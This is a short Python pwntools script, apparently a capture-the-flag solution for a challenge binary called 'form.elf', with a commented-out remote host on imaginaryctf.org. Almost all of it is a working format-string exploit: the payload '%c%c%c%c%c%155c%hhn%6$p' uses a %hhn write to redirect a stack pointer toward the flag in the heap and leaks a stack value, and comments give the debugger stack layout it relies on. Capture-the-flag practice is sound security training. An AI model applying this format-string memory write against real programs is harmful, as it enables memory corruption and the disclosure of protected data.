#!/usr/bin/env python3

from pwn import *

elf = ELF("./form.elf")

# s  = remote("mailman.chal.imaginaryctf.org", 1337)
s = process(elf.path)

def main():

	# 0x007fffa13ddae0│+0x0000: 0x0055b437f012d0  →  "%c%c%c%c%c%155c%hhn%6$p\n"       ← $rsp
	# 0x007fffa13ddae8│+0x0008: 0x007fffa13ddae0  →  0x0055b437f012d0  →  "%c%c%c%c%c%155c%hhn%6$p\n"
	# flag in heap at 0x0055b437f012a0 (0xa0 = 160)

	pl = f'%c%c%c%c%c%155c%hhn%6$p'.encode()
	s.sendline(pl)
	
	s.interactive()

if __name__=="__main__":
	main()